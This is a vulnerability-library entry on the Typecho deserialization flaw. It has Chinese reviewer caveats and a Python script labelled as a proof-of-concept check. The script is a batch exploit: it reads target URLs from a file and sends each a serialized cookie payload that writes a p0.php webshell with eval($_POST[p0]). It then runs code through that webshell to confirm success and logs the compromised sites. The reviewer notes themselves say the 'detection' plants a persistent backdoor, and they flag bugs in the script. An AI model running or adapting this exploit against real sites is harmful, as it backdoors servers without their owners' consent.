---
source: "白阁文库 BaizeSec/bylibrary"
product: "Typecho version unspecified"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "typecho反序列化漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：install.php?finish入口/Referer、PHPassert gadget，写p0.php目录可写"
side_effects: "未执行；本文需注意的操作影响：Python2reload/setdefaultencoding与注释Python3混淆；所谓POC检测实际落持久webshell"
source_status: "unknown"
id: "vw-8830959fa2dda5b7707fc5b6"
entity_id: "ve-8830959fa2dda5b7707fc5b6"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：install.php?finish入口/Referer、PHPassert gadget，写p0.php目录可写

- **结论使用边界（1）**：urlsss计算install.php?finish=1却根本未请求，真正GET只self.url，若输入根地址不会触发；若输入完整入口又拼/p0.php错误。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：Semaphore只有release没有acquire，宣称最大10线程实际未限；所有线程共享Session。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **实验改动边界（3）**：Python2reload/setdefaultencoding与注释Python3混淆；所谓POC检测实际落持久webshell。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **事实待核（4）**：缺版本/出处与执行结果，需替换为准确历史实现而非继续跑。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

### typecho反序列化漏洞  

### POC检测代码

```python
#/usr/bin/env python
# -*- coding: UTF-8 -*-
import getopt,sys
import requests
import sys
import string
import time
import threading

class check(threading.Thread): 
    def __init__(self, url, sem):
        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
        self.url = url
        self.sem = sem

    def run(self):
        headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
                'Referer': self.url,
                'cookie': "__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=="
                }
        try:
            reqs=s.get(self.url,timeout=3,headers=headers,allow_redirects=False)
            #print(reqs.status_code),
        except IOError:                  #如果网站打不开将输出fail
            print("time out 1")
        urls=self.url+"/p0.php"
        urlsss=self.url+"/install.php?finish=1"
        payloads={'p0':'echo "sectest";'}
        try:
            reqss=s.post(urls,allow_redirects=False,timeout=3,data=payloads)#测试是否文件创建成功
            body=reqss.text
            if body.find('sectest')!=-1:
                 print("web is success----->>>>>>"+self.url)
                 with open("./success.txt", "a+") as f1:
                    f1.write(self.url + "\n")
            else: 
                 print("web is fail-------->>>>>>"+self.url)
            print('\n')
        except IOError:                  #如果网站打不开将输出fail
            print("time out 2")
        self.sem.release()

if __name__ == '__main__':
    reload(sys)#同下解决中文乱码
    sys.setdefaultencoding('utf-8')#解决中文乱码
    f = open("./1.txt")#打开批量扫描的网站文件
    s=requests.Session()
    sem = threading.Semaphore(10)      #最大线程数为10个
    for line in f.readlines():#读取每一行的网站
            line=line.strip('\n')#消去换行
            url=line#每行的网站赋值给url
            host_thread = check(url,sem)
            host_thread.start()#执行check()的执行函数
```

------
使用方法：在当前页面下创建./1.txt（为需要检测的url），success.txt为含有漏洞的url。


---

> 来源：白阁文库 BaizeSec/bylibrary
